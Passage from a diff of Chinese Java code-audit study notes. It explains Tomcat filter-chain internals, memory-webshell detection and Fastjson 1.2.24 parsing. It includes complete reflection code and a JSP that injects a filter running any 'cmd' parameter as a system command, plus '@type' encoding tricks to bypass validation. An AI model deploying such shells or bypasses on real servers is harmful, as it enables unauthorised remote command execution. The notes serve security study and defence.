+        	continue;
+        }
+        if (!matchFiltersURL(filterMaps[i], requestPath))
+        	continue;
+        
+        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
+        		context.findFilterConfig(filterMaps[i].getFilterName());
+        
+        if (filterConfig == null) {
+        	// FIXME - log configuration problem
+        	continue;
+        }
+        filterChain.addFilter(filterConfig);
+    }
+    ```
+
+    如果当前请求的url与FilterMap中的urlPattern匹配，就会调用 findFilterConfig 方法在 filterConfigs 中**寻找对应 filterName名称的 FilterConfig**，然后如果不为null，就进入if循环。**将 filterConfig 添加到 filterChain中**（也就是只要匹配对了url，那么全部加入到chain中,这里是放到filters数组中），跟进addFilter方法。
+
+    ```java
+        void addFilter(ApplicationFilterConfig filterConfig) {
+    
+            //遍历filters数组，去掉重复的过滤器设置
+            // Prevent the same filter being added multiple times
+            for(ApplicationFilterConfig filter:filters)
+                if(filter==filterConfig)
+                    return;
+    
+            if (n == filters.length) {
+                ApplicationFilterConfig[] newFilters =
+                    new ApplicationFilterConfig[n + INCREMENT];
+                System.arraycopy(filters, 0, newFilters, 0, n);
+                filters = newFilters;
+            }
+            //将filterConfig添加到filters中
+            filters[n++] = filterConfig;
+    
+        }
+    
+    ```
+
+    重复遍历直至将所有的filter全部装载到filterchain中
+
+    重新回到 StandardContextValue 中，调用 filterChain 的 doFilter 方法 ，就会依次调用 Filter 链上的 doFilter方法
+
+    ```java
+    try {
+    	SystemLogHandler.startCapture();
+        if (request.isAsyncDispatching()) {
+        	request.getAsyncContextInternal().doInternalDispatch();
+        } else {
+        	filterChain.doFilter(request.getRequest(),
+        	response.getResponse());
+    	}
+    }
+    ```
+
+    跟进doFilter方法，在 doFilter 方法中会调用 internalDoFilter方法
+
+    ```java
+    public void doFilter(ServletRequest request, ServletResponse response)
+        throws IOException, ServletException {
+    
+        if( Globals.IS_SECURITY_ENABLED ) {
+        } else {
+            internalDoFilter(request,response);
+        }
+    }
+    
+    ```
+
+    跟进internalDoFilter方法
+
+    ```java
+    // Call the next filter if there is one
+    if (pos < n) {
+        ApplicationFilterConfig filterConfig = filters[pos++];
+        try {
+            
+            
+            Filter filter = filterConfig.getFilter();
+    
+            if (request.isAsyncSupported() && "false".equalsIgnoreCase(
+                    filterConfig.getFilterDef().getAsyncSupported())) {
+                request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);
+            }
+            if( Globals.IS_SECURITY_ENABLED ) {
+                final ServletRequest req = request;
+                final ServletResponse res = response;
+                Principal principal =
+                    ((HttpServletRequest) req).getUserPrincipal();
+    
+                Object[] args = new Object[]{req, res, this};
+                SecurityUtil.doAsPrivilege ("doFilter", filter, classType, args, principal);
+            } else {
+                           
+                filter.doFilter(request, response, this);
+    
+            }
+    
+    }
+    ```
+
+    发现会依次从 filters 中取出 filterConfig，然后会调用 getFilter() 将 filter 从filterConfig 中取出，调用 filter 的 doFilter方法。从而调用我们自定义过滤器中的 doFilter 方法，从而触发了相应的代码。
+
+    **总结：**
+
+    1. 根据请求的 URL 从 FilterMaps 中找出与之 URL 对应的 Filter 名称
+    2. 根据 Filter 名称去 FilterConfigs 中寻找对应名称的 FilterConfig
+    3. 找到对应的 FilterConfig 之后添加到 FilterChain中，并且返回 FilterChain
+    4. filterChain 中调用 internalDoFilter 遍历获取 chain 中的 FilterConfig ，然后从 FilterConfig 中获取 Filter，然后调用 Filter 的 doFilter 方法
+
+- 根据上面的总结可以发现最开始是从 context 中获取的 FilterMaps
+
+- 将符合条件的依次按照顺序进行调用，那么我们可以将自己创建的一个 FilterMap 然后将其放在 FilterMaps 的最前面，这样当 urlpattern 匹配的时候就回去找到对应 FilterName 的 FilterConfig ，然后添加到 FilterChain 中，最终触发我们的内存shell。
+
+### **动态添加Filter**
+
+可以发现程序在创建过滤器链的时候，如果我们能够修改filterConfigs，filterDefs，filterMaps这三个变量，将我们恶意构造的FilterName以及对应的urlpattern存放到FilterMaps，就可以组装到filterchain里，当访问符合urlpattern的时候，就能达到利用Filter执行内存注入的操作。
+
+- 根据Tomcat注册Filter的操作，可以大概得到如何动态添加一个Filter
+
+    - 获取standardContext
+    - 创建一个Filter
+    - 使用filterDef封装Filter对象，将filterDef添加到filterDefs和FilterConfig
+    - 获取filterConfigs变量，并向其中添加filterConfig对象
+    - 创建filterMap，将URL和filter进行绑定，添加到filterMaps中
+
+- 通过分析得到动态添加Filter只需5个步骤，下面笔者将根据Tomcat注册Filter的操作，通过反射操作实现动态添加Filter。
+
+- **1. 获取standardContext**
+
+    - 获取standardContext多种多样，StandardContext主要负责管理session，Cookie，Servlet的加载和卸载。因此在Tomcat中的很多地方都有保存。
+
+    - **在这之前先来说一下****ServletContext(只是一个接口)跟StandardContext的关系：**
+
+        - Tomcat中的对应的ServletContext实现是ApplicationContext。
+        - 在Web应用中获取的ServletContext实际上是ApplicationContextFacade对象，对ApplicationContext进行了封装，而ApplicationContext实例中又包含了StandardContext实例，以此来获取操作Tomcat容器内部的一些信息，例如Servlet的注册等。通过下面的图可以很清晰的看到两者之间的关系
+        - ![img](./java代码审计.assets/1628306571447-11fa0bc8-ab65-4c01-95cc-5705eefb3752.png)
+
+    - 如果我们能够直接获取request的时候，可以使用以下方法直接获取context。其实也是层层递归取出context字段的值。
+
+        ```java
+        ServletContext servletContext = request.getSession().getServletContext();
+        Field appContextField = servletContext.getClass().getDeclaredField("context");
+        appContextField.setAccessible(true);
+        ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
+        //上面几行的目的是为了获取(ApplicationContext)context
+        
+        
+        Field standardContextField = applicationContext.getClass().getDeclaredField("context");
+        standardContextField.setAccessible(true);
+        StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
+        ```
+
+        获取到standardContext就可以很方便的将其他对象添加在Tomcat Context中。
+
+        [如果没有request对象的话可以从当前线程中获取StandardContext](https://zhuanlan.zhihu.com/p/114625962)
+
+        当然也可以从MBean中获取，可以参考下面文章
+
+        《[TOMCAT FILTER 之动态注入](https://scriptboy.cn/p/tomcat-filter-inject/#)》
+
+        《[通过Mbean获取context](https://paper.seebug.org/1441/#2mbeancontext)》
+
+        
+
+    **2. 创建Filter**
+
+    直接在代码中实现Filter实例，需要重写三个重要方法，init、doFilter、destory，如下面代码所示：
+
+    ```java
+    Filter filter = new Filter() {
+        @Override
+        public void init(FilterConfig filterConfig) throws ServletException {
+        }
+        @Override
+        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+            HttpServletRequest req = (HttpServletRequest) servletRequest;
+            if (req.getParameter("cmd") != null){
+                InputStream in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();
+                Scanner s = new Scanner(in).useDelimiter("\\A");
+                String output = s.hasNext() ? s.next() : "";
+                servletResponse.getWriter().write(output);
+                return;
+            }
+            filterChain.doFilter(servletRequest,servletResponse);
+        }
+        @Override
+        public void destroy() {
+        }
+    };
+    ```
+
+    在doFilter方法中实现命令执行回显功能。
+
+**3. 创建filterDef封装Filter对象，并添加到FilterDefs中**
+
+为了之后将内存马融合进反序列化payload中，这里特意使用反射获取FilterDef对象。如果使用的是jsp或者是非反序列化的利用，那么可以直接使用new创建对象。
+
+```java
+Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
+Constructor declaredConstructors = FilterDef.getDeclaredConstructor();
+FilterDef o = (org.apache.tomcat.util.descriptor.web.FilterDef)declaredConstructors.newInstance();
+o.setFilter(filter);
+o.setFilterName(FilterName);
+o.setFilterClass(filter.getClass().getName());
+standardContext.addFilterDef(o);
+```
+
+setFilter方法将自己创建的Filter绑定在FilterDef中，setFilterName设置的是Filter的名称，最后把FilterDef添加在standardContext的FilterDefs变量中。
+
+**4. 创建filterMap绑定URL，并添加到FilterMaps中**
+
+通过反射创建FilterMap实例，该部分代码主要是注册filter的生效路由，并将FilterMap对象添加在standardContext中FilterMaps变量的第一个。
+
+```java
+Class<?> FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
+Constructor<?> declaredConstructor = FilterMap.getDeclaredConstructor();
+org.apache.tomcat.util.descriptor.web.FilterMap o1 = (org.apache.tomcat.util.descriptor.web.FilterMap)declaredConstructor.newInstance();
+
+o1.addURLPattern("/*");
+o1.setFilterName(FilterName);
+o1.setDispatcher(DispatcherType.REQUEST.name());//只支持 Tomcat 7.x 以上
+////添加我们的filterMap到所有filter最前面
+standardContext.addFilterMapBefore(o1);
+```
+
+**5. 利用filterdef创建 ApplicationFilterConfig并添加到filterConfigs 中**
+
+之后通过反射生成ApplicationFilterConfig对象，并将其放入filterConfigs hashMap中。
+
+```java
+Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
+Constructor<?> declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);
+declaredConstructor1.setAccessible(true);
+ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);
+
+//FilterConfig并添加到filterConfigs 中
+Configs = StandardContext.class.getDeclaredField("filterConfigs");
+Configs.setAccessible(true);
+filterConfigs = (Map) Configs.get(standardContext);
+filterConfigs.put(FilterName,filterConfig);
+```
+
+完整代码
+
+```java
+Field Configs = null;
+Map filterConfigs;
+try {
+    //Step 1
+    ServletContext servletContext = request.getSession().getServletContext();
+
+    Field appctx = servletContext.getClass().getDeclaredField("context");
+    appctx.setAccessible(true);
+    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
+
+    Field stdctx = applicationContext.getClass().getDeclaredField("context");
+    stdctx.setAccessible(true);
+    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
+
+    String FilterName = "cmd_Filter";
+    Configs = StandardContext.class.getDeclaredField("filterConfigs");
+    Configs.setAccessible(true);
+    filterConfigs = (Map) Configs.get(standardContext);
+    //Step 2
+    if (filterConfigs.get(FilterName) == null){
+        Filter filter = new Filter() {
+
+            @Override
+            public void init(FilterConfig filterConfig) throws ServletException {
+
+            }
+
+            @Override
+            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+                HttpServletRequest req = (HttpServletRequest) servletRequest;
+                if (req.getParameter("cmd") != null){
+
+                    InputStream in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();
+                    //
+                    Scanner s = new Scanner(in).useDelimiter("\\A");
+                    String output = s.hasNext() ? s.next() : "";
+                    servletResponse.getWriter().write(output);
+
+                    return;
+                }
+                filterChain.doFilter(servletRequest,servletResponse);
+            }
+            @Override
+            public void destroy() {
+            }
+        };
+        //Step 3
+        Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
+        Constructor declaredConstructors = FilterDef.getDeclaredConstructor();
+        FilterDef o = (org.apache.tomcat.util.descriptor.web.FilterDef)declaredConstructors.newInstance();
+        o.setFilter(filter);
+        o.setFilterName(FilterName);
+        o.setFilterClass(filter.getClass().getName());
+        standardContext.addFilterDef(o);
+        //Step 4
+        Class<?> FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
+        Constructor<?> declaredConstructor = FilterMap.getDeclaredConstructor();
+        org.apache.tomcat.util.descriptor.web.FilterMap o1 = (org.apache.tomcat.util.descriptor.web.FilterMap)declaredConstructor.newInstance();
+
+        o1.addURLPattern("/*");
+        o1.setFilterName(FilterName);
+        o1.setDispatcher(DispatcherType.REQUEST.name());
+        standardContext.addFilterMapBefore(o1);
+
+        //Step 5
+        Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
+        Constructor<?> declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);
+        declaredConstructor1.setAccessible(true);
+        ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);
+        filterConfigs.put(FilterName,filterConfig);
+    }
+} catch (Exception e) {
+    e.printStackTrace();
+}
+```
+
+filterDemo.jsp
+
+```jsp
+<%@ page import="org.apache.catalina.core.ApplicationContext" %>
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="java.util.Map" %>
+<%@ page import="java.io.IOException" %>
+<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
+<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
+<%@ page import="java.lang.reflect.Constructor" %>
+<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
+<%@ page import="org.apache.catalina.Context" %>
+<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
+
+<%
+  final String name = "FilterAgent";
+  ServletContext servletContext = request.getSession().getServletContext();
+
+  Field appctx = servletContext.getClass().getDeclaredField("context");
+  appctx.setAccessible(true);
+  ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
+
+  Field stdctx = applicationContext.getClass().getDeclaredField("context");
+  stdctx.setAccessible(true);
+  StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
+
+  Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
+  Configs.setAccessible(true);
+  Map filterConfigs = (Map) Configs.get(standardContext);
+
+  if (filterConfigs.get(name) == null){
+    Filter filter = new Filter() {
+      @Override
+      public void init(FilterConfig filterConfig) throws ServletException {
+
+      }
+
+      @Override
+      public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+        HttpServletRequest req = (HttpServletRequest) servletRequest;
+        if (req.getParameter("cmd") != null){
+          byte[] bytes = new byte[1024];
+          Process process = new ProcessBuilder("cmd","/c",req.getParameter("cmd")).start();
+          int len = process.getInputStream().read(bytes);
+          servletResponse.getWriter().write(new String(bytes,0,len));
+          process.destroy();
+          return;
+        }
+        filterChain.doFilter(servletRequest,servletResponse);
+      }
+
+      @Override
+      public void destroy() {
+
+      }
+
+    };
+
+
+    FilterDef filterDef = new FilterDef();
+    filterDef.setFilter(filter);
+    filterDef.setFilterName(name);
+    filterDef.setFilterClass(filter.getClass().getName());
+    /**
+     * 将filterDef添加到filterDefs中
+     */
+    standardContext.addFilterDef(filterDef);
+
+    FilterMap filterMap = new FilterMap();
+    filterMap.addURLPattern("/testshell");
+    filterMap.setFilterName(name);
+    filterMap.setDispatcher(DispatcherType.REQUEST.name());
+
+    standardContext.addFilterMapBefore(filterMap);
+
+    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
+    constructor.setAccessible(true);
+    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
+
+    filterConfigs.put(name,filterConfig);
+    out.print("Inject Success !");
+  }
+%>
+
+```
+
+上传jsp文件后执行，访问对应url。
+
+![image-20220427104210649](./java代码审计.assets/image-20220427104210649.png)
+
+tomcat 7 与 tomcat 8 在 FilterDef 和 FilterMap 这两个类所属的包名不一样
+
+```jsp
+<!-- tomcat 8/9 -->
+
+<!-- page import = "org.apache.tomcat.util.descriptor.web.FilterMap"
+
+<!-- page import = "org.apache.tomcat.util.descriptor.web.FilterDef" -->
+
+
+
+<!-- tomcat 7 -->
+
+<%@ page import = "org.apache.catalina.deploy.FilterMap" %>
+
+<%@ page import = "org.apache.catalina.deploy.FilterDef" %>
+```
+
+
+
+### 内存马排查
+
+如果我们通过检测工具或者其他手段发现了一些内存webshell的痕迹，需要有一个排查的思路来进行跟踪分析，也是根据各类型的原理，列出一个排查思路
+
+```java
+如果是jsp注入，日志中排查可疑jsp的访问请求。
+
+如果是代码执行漏洞，排查中间件的error.log，查看是否有可疑的报错，判断注入时间和方法
+
+根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。
+
+如果是servlet或者spring的controller类型，根据上报的webshell的url查找日志（日志可能被关闭，不一定有），根据url最早访问时间确定被注入时间。
+
+如果是filter或者listener类型，可能会有较多的404但是带有参数的请求，或者大量请求不同url但带有相同的参数，或者页面并不存在但返回200
+```
+
+《[tomcat内存马的多种查杀方式](https://syst1m.com/post/memory-webshell/#防守视角-tomcat内存马的多种查杀方式)》
+
+#### java-memshell-scanner
+
+工具链接：https://github.com/c0ny1/java-memshell-scanner
+
+c0ny1 师傅写的检测内存马的工具，通过jsp脚本扫描并查杀各类中间件内存马，比Java agent要温和一些。能够检测并且进行删除，是一个非常方便的工具
+
+但是需要上传jsp文件，然后访问。
+
+![image-20220427110026260](./java代码审计.assets/image-20220427110026260.png)
+
+可以看到，检测到了我们上传的内存马，并且可以dump出class文件查看是不是内存马，然后可以kill掉这个内存马。
+
+### arthas
+
+arthas是Alibaba开源的Java诊断工具，只能检测不能查杀
+
+
 
 ## RMI
 
@@ -5413,7 +6458,7 @@ public class Test {
 
 **自省类的反序列化**
 
-- **JSON 标准是不⽀持⾃省的，也就是说根据 JSON ⽂本，不知道它包含的对象的类型。**
+- **JSON 标准是不支持自省的，也就是说根据 JSON ⽂本，不知道它包含的对象的类型。**
 - FastJson ⽀持⾃省，在序列化时传⼊类型信息 SerializerFeature.WriteClassName ，可以得到能 表明对象类型的 JSON ⽂本。
 - **FastJson 的漏洞就是由于这个功能引起的。**
 
@@ -5507,8 +6552,8 @@ public class Test {
 - **调⽤了全部的 getter ⽅法， setter ⽅法全部调⽤，但 getProp2_2 额外调⽤⼀次（共调⽤了两次）。**
 
 - **使⽤ JSON.parse 函数也同样能进⾏反序列化**
-    - 反序列化时的 getter 、 setter 调⽤情况和⾮⾃省的⼀样，会调⽤了全部的 setter
-    - publibc 修饰的成员全部赋值， private 修饰的成员则为 NULL 。
+    - 反序列化时的 getter 、 setter 调⽤情况和非⾃省的⼀样，会调⽤了全部的 setter
+    - publibc 修饰的成员全部赋值， **private 修饰的成员则为 NULL** 。（在找寻利用链时会影响）
 
 **Feature.SupportNonPublicField**
 
@@ -5519,12 +6564,1139 @@ public class Test {
 
 ##### **fastJson机制总结**
 
-- `type`该关键词的特性会加载任意类，并给提供的输入字段的值进行恢复，如果字段有setter、getter方法会自动调用该方法，进行赋值，恢复出整个类。
+- 由于Fastjson在 1.2.24 版本下默认开启 autoType ，导致攻击者可以控制 @type 中 的类为任意类，此时如果某个类的 get 、 set 等⽅法中存在漏洞，就可以被恶意利⽤，与Jackson⼀致，不过不同的是，Fastjson设计 autoType 并不是为了兼 容Java的某些特性，⽽是单纯为了开发者节约时间...然⽽Jackson设计 Default Typing 是为了能够兼容Java中多态的特性。
+
 - **这个过程会被叫做fastjson的反序列化过程，注意不要把这个过程跟java反序列化过程混为一谈。它们两个是同等级的存在，而不是前者基于后者之上。也就是说readObject()反序列化利用点那一套在这根本不适用。**相应的type加载任意类+符合条件的setter与getter变成了反序列化利用点（个人总结的三要素中的反序列化漏洞触发点）。
 
-- `parseObject(String text, Class clazz)` ，构造⽅法 + setter + 满⾜条件额外的 getter 会被调用
-- `parse(String text)` ，构造⽅法 + setter + 满⾜条件额外的 getter
-- `JSONObject parseObject(String text)` ，构造⽅法 + setter + **getter** + 满⾜条件额外 的 getter。**就比上面多了getter全部调用（有些漏洞利用在get函数里面，parse()不会调用这个函数，所以就要利用JSONObject对象的 toString() 方法实现了突破）**
+- `parseObject(String text, Class clazz)` ，构造⽅法 + setter + 满⾜条件额外的 getter 会被调用。
+
+    - **这种情况下同样存在漏洞**，但是因为传入了clazz的类，所以不是使用最原始的poc。
+    - `{"a":{poc}}`，后面在1.2.24漏洞里面会讲为什么这样
+
+- **`parse(String text)` ，构造⽅法 + setter + 满足条件额外的 getter**‘
+
+    - （有些漏洞利用在get函数里面，parse()不会调用这个函数，所以就要利用JSONObject对象的 toString() 方法实现了突破）
+    - 后面再讲
+
+- `parseObject(String text)` ，构造⽅法 + setter + **getter** + 满⾜条件额外 的 getter。**就比上面多了getter全部调用**
+
+    - ```javascript
+        public static JSONObject parseObject(String text) {
+            Object obj = parse(text);
+            if (obj instanceof JSONObject) {
+            	return (JSONObject) obj;
+            }
+        
+            return (JSONObject) JSON.toJSON(obj);
+        }
+        ```
+
+    - 可以看到`parseObject`调用的也是`parse`，只是最后还调用了`toJSON`方法。这也就是为什么会多调用getter方法。
+
+
+##### **parse方法源码分析**
+
+- 下个断点慢慢分析
+
+    - ```java
+        package fastjson;
+        
+        import com.alibaba.fastjson.JSON;
+        import com.alibaba.fastjson.JSONObject;
+        
+        class User{
+            private String name;
+            private int age;
+            private Flag flag;
+            public User(){
+                System.out.println("User constructor has called.");
+                this.name = "p1g3";
+                this.age = 19;
+                this.flag = new Flag();
+            }
+            public String getName() {
+                System.out.println("getName has called.");
+                return name;
+            }
+            public void setName(String name) {
+                System.out.println("setName has called.");
+                this.name = name;
+            }
+            public int getAge() {
+                System.out.println("getAge has called.");
+                return age;
+            }
+            public void setAge(int age) {
+                System.out.println("setAge has called.");
+                this.age = age;
+            }
+            public Flag getFlag() {
+                System.out.println("getFlag has called.");
+                return flag;
+            }
+            public void setFlag(Flag flag) {
+                System.out.println("setFlag has called.");
+                this.flag = flag;
+            }
+            @Override
+            public String toString() {
+                return "User{" +
+                        "name='" + name + '\'' +
+                        ", age=" + age +
+                        ", flag=" + flag +
+                        '}';
+            }
+        }
+        class Flag{
+            private String flag;
+            public Flag(){
+                System.out.println("Flag constructor has called.");
+                this.flag = "flag{d0g3_learn_java}";
+            }
+            public String getFlag() {
+                System.out.println("getFlag has called.");
+                return flag;
+            }
+            public void setFlag(String flag) {
+                System.out.println("setFlag has called.");
+                this.flag = flag;
+            }
+        }
+        
+        public class FJ1_2_24 {
+            public static void main(String[] args) {
+                User user = new User();
+                String jsonstr = "{\"@type\":\"fastjson.User\",\"age\":19,\"flag\":{\"flag\":\"flag{d0g3_learn_java}\"},\"name\":\"p1g3\"}";
+        
+                //反序列化
+                Object b = JSON.parse(jsonstr);
+                //Object b = JSON.parse(jsonstr_a);
+                System.out.println(b);
+        
+        
+            }
+        }
+        
+        ```
+
+- 在第⼀⾏通过 parse ⽅法将JSON字符串转为对象：
+
+    - ```java
+        public static Object parse(String text) {
+        	return parse(text, DEFAULT_PARSER_FEATURE);
+        }
+        ```
+
+    - ```java
+        public static Object parse(String text, int features) {
+             if (text == null) {
+             	return null;
+             } else {
+                 DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features);
+                 Object value = parser.parse();
+                 parser.handleResovleTask(value);
+                 parser.close();
+                 return value;
+             }
+         }
+        
+        ```
+
+-  parse ⽅法中，会⾸先创建⼀个 `DefaultJSONParser` 对象，在创建对象时有这么⼏⾏代码需要注意：
+
+    - ```
+            public DefaultJSONParser(final Object input, final JSONLexer lexer, final ParserConfig config){
+                this.lexer = lexer;
+                this.input = input;
+                this.config = config;
+                this.symbolTable = config.symbolTable;
+        
+                int ch = lexer.getCurrent();
+                if (ch == '{') {
+                    lexer.next();
+                    ((JSONLexerBase) lexer).token = JSONToken.LBRACE;//12
+                } else if (ch == '[') {
+                    lexer.next();
+                    ((JSONLexerBase) lexer).token = JSONToken.LBRACKET;//14
+                } else {
+                    lexer.nextToken(); // prime the pump
+                }
+            }
+        ```
+
+    - 在这⾥会先判断当前解析的字符串是 { 还是 [ ，如果是这两者则设置为对应的token。随后通过 next 向下偏移。
+
+- 随后通过 DefaultJSONParser#parse ⽅法获取对象，该⽅法中⾸先会通过 switch 对当前的token进⾏各种处理，因为前⾯的token被设置为LBRACE了，所以在这⾥ 会进⼊到 case LBRACE 中：
+
+    - ```java
+        case LBRACE:
+            JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField));
+            return parseObject(object, fieldName);
+        ```
+
+- 在第⼀⾏会创建⼀个空的JSONObject，随后会通过 `parseObject` ⽅法进⾏解析，从这⾥开始代码就变成⾃带混淆的了，⼀个 parseObject ⽅法⼏百⾏代码， 完全没有任何的分类处理，写的很是难看，不过这⾥⼜极其重要，就必须得每⾏都看，挺头疼的。
+
+- 在该⽅法中，通过 for循环来遍历JSON中的每⼀个字符串并对其进⾏解析
+
+    - ```java
+        try {
+            boolean setContextFlag = false;
+            for (;;) {
+                lexer.skipWhitespace();
+                char ch = lexer.getCurrent();
+                if (lexer.isEnabled(Feature.AllowArbitraryCommas)) {
+                    while (ch == ',') {
+                        lexer.next();
+                        lexer.skipWhitespace();
+                        ch = lexer.getCurrent();
+                    }
+            }
+        
+        ```
+
+    - 可以发现在第⼀⾏会调⽤ skipWhitespace ⽅法，从⽅法名应该就可以理解该⽅法主要会做什么了
+
+        - ```java
+                public final void skipWhitespace() {
+                    for (;;) {
+                        if (ch <= '/') {
+                            if (ch == ' ' || ch == '\r' || ch == '\n' || ch == '\t' || ch == '\f' || ch == '\b') {
+                                next();
+                                continue;
+                            } else if (ch == '/') {
+                                skipComment();
+                                continue;
+                            } else {
+                                break;
+                            }
+                        } else {
+                            break;
+                        }
+                    }
+                }
+            ```
+
+        - 从代码中可以看出来，该⽅法会判断当前解析的字符是否为 、 \r 、 \n 、 \t 、 \f 、 \b 、 / ，如果是以上字符，则会跳过这些字符的解析，将偏移向前， 从这⾥可以看出来，默认情况下Fastjson不会解析JSON中的空格以及注释，⽐如下⾯这⼏种情况实际上是等价的
+
+            - ```json
+                {"@type":"com.p1g3.fastjson"}
+                { "@type":"com.p1g3.fastjson"}
+                {/**/"@type":"com.p1g3.fastjson"}
+                ```
+
+    - 在忽略完这些字符后，会先获取当前解析的字符并判断是否开启了 AllowArbitraryCommas 选项，默认为true，如果开启了，则会忽略JSON中多个连续的逗 号，⽐如下⾯⼏种情况是等价的：
+
+        - ```json
+            "@type":"com.p1g3.fastjson"}
+            {,,,,"@type":"com.p1g3.fastjson"}
+            ```
+
+- **上⾯这⼏种情况就可以进⾏⼀些简单的绕过，比如某个正则验证了JSON是否以 {"@type 开头，此时就可以通过上⾯的两种解析特性先简单绕过⼀次，因为 Feature是⼀个枚举类，其中包含了如下的这些属性：**
+
+    - ```java
+        public enum Feature {
+         AutoCloseSource,
+         AllowComment,
+         AllowUnQuotedFieldNames,
+         AllowSingleQuotes,
+         InternFieldNames,
+         AllowISO8601DateFormat,
+         AllowArbitraryCommas,
+         UseBigDecimal,
+         IgnoreNotMatch,
+         SortFeidFastMatch,
+         DisableASM,
+         DisableCircularReferenceDetect,
+         InitStringFieldAsEmpty,
+         SupportArrayToBean,
+         OrderedField,
+         DisableSpecialKeyDetect,
+         UseObjectArray,
+         SupportNonPublicField;
+        ```
+
+    - 当时⽐较好奇这每个属性都对应是做什么的，以及哪些属性默认是开启的，所以去⽹上查了资料，获得下⾯⼀份表
+
+        - ![image-20221103215915936](./java代码审计.assets/image-20221103215915936.png)
+
+        - ![image-20221103215936595](./java代码审计.assets/image-20221103215936595.png)
+
+        - ![image-20221103215955526](./java代码审计.assets/image-20221103215955526.png)
+
+    - 虽然表中记录的 Feature.AllowArbitraryCommas 是默认关闭的，但毕竟实践得真知，⾄少在我使⽤的 1.2.24 版本中是默认开启的。
+
+- 因为⽬前解析到了 `{` 后的⼀位 " ，所以进⼊到了 if 语句块中
+
+    - ```java
+        if (ch == '"') {
+            key = lexer.scanSymbol(symbolTable, '"');
+            lexer.skipWhitespace();
+            ch = lexer.getCurrent();
+            if (ch != ':') {
+            	throw new JSONException("expect ':' at " + lexer.pos() + ", name " + key);
+        	}
+        }
+        ```
+
+    - 在这⾥⾸先会通过 scanSymbol ⽅法，该⽅法主要做的就是获取⽬前的字符以及到第⼆个参数为⽌的字符，比如此时的第⼆个参数是⼀个双引号，那么就会获取到双引号之前的字符，比如 `"@type"` ，此时获取到的内容就是 `@type` 
+
+    - 这⾥还有⼀个⽐较重要的地⽅就是他会对获取到的字符串进⾏unicode解码以及⼗六进制解码
+
+        - ```java
+            case 'x':
+                char x1 = ch = next();
+                char x2 = ch = next();
+            
+                int x_val = digits[x1] * 16 + digits[x2];
+                char x_char = (char) x_val;
+                hash = 31 * hash + (int) x_char;
+                putChar(x_char);
+                break;
+            case 'u':
+                char c1 = chLocal = next();
+                char c2 = chLocal = next();
+                char c3 = chLocal = next();
+                char c4 = chLocal = next();
+                int val = Integer.parseInt(new String(new char[] { c1, c2, c3, c4 }), 16);
+                hash = 31 * hash + val;
+                putChar((char) val);
+            ```
+
+    - **所以在JSON中的键实际上可以转成unicode与⼗六进制两种形式：**
+
+        - ```java
+            {"@type":"com.p1g3.fastjson"} == {"\u0040\u0074\u0079\u0070\u0065":"com.p1g3.fastjson"} ==
+            {"\x40\x74\x79\x70\x65":"com.p1g3.fastjson"}
+            ```
+
+- 在上述代码内获取到 key 后，同样会调⽤⼀次 `skipWhitespace` ⽅法，笔者认为，**Fastjson会忽略引号外的⼀切空格、注释等相关代码**。随后会判断⽬前获取到 的key是否为 `JSON.DEFAULT_TYPE_KEY` ， JSON.DEFAULT_TYPE_KEY 对应为 `@type` ：
+
+    - ```java
+        if (key == JSON.DEFAULT_TYPE_KEY && !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {
+             ref = lexer.scanSymbol(this.symbolTable, '"');
+             Class<?> clazz = TypeUtils.loadClass(ref, this.config.getDefaultClassLoader());
+             if (clazz != null) {
+                 lexer.nextToken(16);
+                 if (lexer.token() != 13) {
+                 this.setResolveStatus(2);
+                 if (this.context != null && !(fieldName instanceof Integer)) {
+                 this.popContext();
+             }
+             if (object.size() > 0) {
+                 instance = TypeUtils.cast(object, clazz, this.config);
+                 this.parseObject(instance);
+                 thisObj = instance;
+                 return thisObj;
+             }
+             ObjectDeserializer deserializer = this.config.getDeserializer(cljavazz);
+             thisObj = deserializer.deserialze(this, clazz, fieldName);
+             return thisObj;
+             }
+        ```
+
